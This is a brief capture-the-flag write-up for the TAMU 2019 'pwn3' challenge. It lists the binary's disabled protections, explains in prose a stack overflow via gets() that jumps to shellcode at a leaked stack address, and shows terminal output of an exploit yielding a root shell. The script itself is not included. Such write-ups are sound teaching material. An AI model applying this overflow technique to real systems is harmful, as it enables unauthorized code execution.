# Tamu19 pwn3

```
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

We are given a stack address, and there's a call to ```gets```. We can write a ```shellcode``` and overflow until we reach ```ret```, which we will replace with that address.

```bash
[root@pwn:~/tamu19_pwn3]$ python expl.py 
[+] Starting local process './pwn3': pid 2213
0xffc5a6de
[*] Switching to interactive mode
!
$ whoami
root
```